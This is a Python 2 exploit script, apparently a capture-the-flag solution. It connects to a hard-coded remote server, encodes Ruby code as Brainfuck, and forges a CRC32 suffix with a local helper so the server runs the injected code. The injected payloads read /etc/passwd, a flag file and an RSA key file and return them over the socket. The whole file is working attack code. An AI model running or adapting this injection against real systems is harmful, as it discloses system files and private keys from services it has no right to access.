import subprocess
from time import sleep
from socket import *

def bf(s):
	p = 0
	q = 0
	K = 50
	ret = ''
	now = 0
	for c in s:
		if ord(c) < K:
			if (now != 0):
				ret += '<'
				now = 0
			while (p < ord(c)):
				p += 1
				ret += '+'
			while (p > ord(c)):
				p -= 1
				ret += '-'
		else:
			if (now != 1):
				ret += '>'
				now = 1
			while (q < ord(c)):
				q += 1
				ret += '+'
			while (q > ord(c)):
				q -= 1
				ret += '-'
		ret += '.'
	return ret


if __name__ == '__main__' :
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(('188.40.147.108', 2000))
	print s.recv(1024)
	#raw = bf("""client.puts File.readlines("/etc/passwd")#""")
	#raw = bf("""client.puts File.readlines("./the_flag.rb")#""")
	raw = bf("""client.puts File.readlines("./rsa_keys.rb")#""")

	p = subprocess.Popen("./crc32", stdin = subprocess.PIPE, stdout = subprocess.PIPE)
	p.stdin.write(str(len(raw)) + "\n")
	p.stdin.write(raw + "\n")
	suffix = p.stdout.read()

	payload = raw + suffix

	print len(payload)
	print payload

	s.send(payload + "\n")
	s.send("1\n")
	sleep(5)
	print s.recv(4096)
